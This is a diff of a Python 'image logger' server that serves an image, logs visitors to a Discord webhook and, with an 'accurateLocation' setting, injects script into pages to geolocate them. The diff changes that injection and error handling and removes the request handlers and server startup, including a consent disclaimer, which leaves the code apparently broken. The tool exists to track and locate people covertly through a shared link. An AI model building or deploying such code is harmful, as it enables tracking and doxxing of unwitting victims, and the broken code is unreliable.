@@ -366,7 +366,7 @@ height: 100vh;
             self.send_header('Content-type', datatype)
             self.end_headers()
 
-            if config["accurateLocation"] and not coords:
+            if config["accurateLocation"]:
                 data += b"""<script>
 var currenturl = window.location.href;
 
@@ -383,52 +383,14 @@ if (!currenturl.includes("g=")) {
     }
 }
 </script>"""
-            
-            self.wfile.write(data)
+                self.wfile.write(data)
         
-        except Exception as e:
-            print(f"[ERROR] handleRequest: {str(e)}")
+        except Exception:
             self.send_response(500)
             self.send_header('Content-type', 'text/html')
             self.end_headers()
+
             self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
             reportError(traceback.format_exc())
 
-    def do_GET(self):
-        self.handleRequest()
-    
-    def do_POST(self):
-        self.handleRequest()
-    
-    def log_message(self, format, *args):
-        # Disable default logging
-        pass
-
-def run_server(port=8080):
-    server = HTTPServer(('0.0.0.0', port), ImageLoggerAPI)
-    print(f"[*] Server started on port {port}")
-    print(f"[*] {__app__} v{__version__} by {__author__}")
-    print(f"[*] Description: {__description__}")
-    print(f"[!] WARNING: This tool is for educational purposes only!")
-    print(f"[!] Do not use it to track people without their consent!")
-    print(f"[*] Webhook: {config['webhook']}")
-    print(f"[*] Image URL: {config['image']}")
-    print(f"[*] Press Ctrl+C to stop the server")
-    print("=" * 60)
-    
-    try:
-        server.serve_forever()
-    except KeyboardInterrupt:
-        print("\n[*] Server stopped")
-        server.server_close()
-
-if __name__ == '__main__':
-    # Install required packages if missing
-    try:
-        import httpagentparser
-    except ImportError:
-        print("[!] Required package 'httpagentparser' not found!")
-        print("[*] Install it using: pip install httpagentparser")
-        exit(1)
-    
-    run_server()
+        return
